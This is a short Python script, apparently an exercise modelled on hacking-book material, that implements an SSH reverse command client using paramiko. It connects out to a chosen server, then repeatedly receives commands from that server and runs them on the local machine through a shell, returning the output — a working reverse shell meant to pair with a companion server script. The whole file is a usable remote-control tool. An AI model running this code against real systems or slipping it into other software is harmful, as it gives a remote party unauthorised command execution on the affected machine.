#!/usr/bin/python3

import paramiko # https://docs.paramiko.org/en/stable/
import sys 
import getpass
import shlex
import subprocess


# [!] SSH client that excecute commands received from the server 
# [!!!] To use along ssh_bh_server.py


# almost the same code of ssh_cmd
def sshCmd(ip, port, user, passwd, cmd='Client Connected'):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
    
    # In case of connection issues
    try:
        # we connect  
        client.connect(ip, port=port, username=user, password=passwd)
    except Exception as e:
        print(e)
        sys.exit(0)
            
    ssh_session = client.get_transport().open_session()
    
    # if the session we send a command 
    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024).decode()) # read banner
        
        while True: 
            # we get a command from the server and we execute it locally
            cmd = ssh_session.recv(1024)
            try:
                cmd = cmd.decode()
                if cmd == "exit":
                    client.close()
                    break
                cmd_output = subprocess.check_output(cmd, shell=True) # Run a cmd on the system through a shell 
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
                
        client.close()
        return
    
    
    
def main():    
    if(len(sys.argv[1:]) != 3):
        print("Usage: ./ssh_reverse_cmd.py  [ip] [port] [user] ")
        print("Example ./ssh_reverse_cmd.py 11.42.0.1 2222 Rorschach")
        sys.exit(0)
     
    ip = sys.argv[1]
    port = sys.argv[2]
    user = sys.argv[3]
    
    print("insert " + user + "'s password:")
    passwd = getpass.getpass()
    
    sshCmd(ip, port, user, passwd)
               
if __name__ == '__main__':
    main()